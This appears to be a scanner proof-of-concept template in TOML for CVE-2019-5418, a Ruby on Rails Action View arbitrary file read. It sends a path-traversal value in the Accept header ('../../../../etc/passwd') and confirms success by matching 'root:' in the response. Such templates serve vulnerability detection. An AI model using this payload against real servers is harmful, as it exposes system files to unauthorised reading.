[info]
author = "ave"
description = "验证 Ruby on Rails Action View 任意文件读取漏洞，通过构造恶意 Accept 请求头读取服务器任意文件"
id = "POC-AVE-2019-1306"
name = "CVE-2019-5418 PoC"
severity = "high"
tags = ["ave-2019-1306"]
vuln_id = [
    "CVE-2019-5418",
    "AVE-2019-1306",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/etc/passwd"
protocol = "http"

[poc.requests.headers]
Accept = "../../../../etc/passwd"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
